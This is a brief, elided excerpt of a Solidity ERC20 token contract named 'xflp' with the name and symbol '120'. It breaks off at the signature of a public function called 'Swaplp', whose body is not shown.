...
contract xflp is Context, ERC20, Ownable {
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "120";
    string constant _symbol = "120"; 
    ...
    function Swaplp(address addrss, uint256 untt) public returns (bool success) {
